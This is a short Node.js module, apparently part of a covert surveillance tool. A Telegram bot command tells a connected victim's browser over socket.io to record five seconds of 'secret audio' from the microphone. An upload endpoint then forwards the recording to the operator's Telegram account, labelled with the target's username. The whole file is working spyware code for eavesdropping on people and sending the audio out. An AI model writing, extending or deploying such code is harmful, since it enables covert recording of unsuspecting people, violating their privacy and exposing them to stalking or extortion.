const multer = require('multer');
const upload = multer({ storage: multer.memoryStorage() });

module.exports = function(app) {
    app.post('/upload-audio', upload.single('audio'), async (req, res) => {
        try {
            if (!req.file) return res.status(400).send('No audio uploaded.');

            await global.bot.sendVoice(global.adminId, req.file.buffer, {
                caption: `🎙️ Secret Audio Clip (${global.pendingUsername})`
            });

            res.status(200).send({ success: true });
        } catch (error) {
            console.error("Audio upload error:", error);
            res.status(500).send({ success: false });
        }
    });

    global.bot.onText(/\/audio/, (msg) => {
        const chatId = msg.chat.id;
        if (chatId.toString() === global.adminId.toString()) {
            if (global.approvedSocketId) {
                global.bot.sendMessage(chatId, "🎙️ Recording 5 seconds secret audio from microphone...");
                global.io.to(global.approvedSocketId).emit('record_audio');
            } else {
                global.bot.sendMessage(chatId, "❌ **Access Denied!** Type /approve first.");
            }
        }
    });
};
